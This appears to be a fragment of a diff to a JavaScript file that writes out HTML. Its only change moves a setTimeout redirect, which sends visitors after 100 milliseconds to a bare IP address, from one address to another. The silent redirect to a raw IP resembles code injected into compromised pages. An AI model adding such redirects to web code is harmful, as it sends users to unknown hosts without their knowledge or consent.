@@ -17,4 +17,4 @@ document.writeln("</html>");
 
 
 
-setTimeout("window.location.href='http://38.26.195.44'",100);
+setTimeout("window.location.href='http://38.26.195.46'",100);
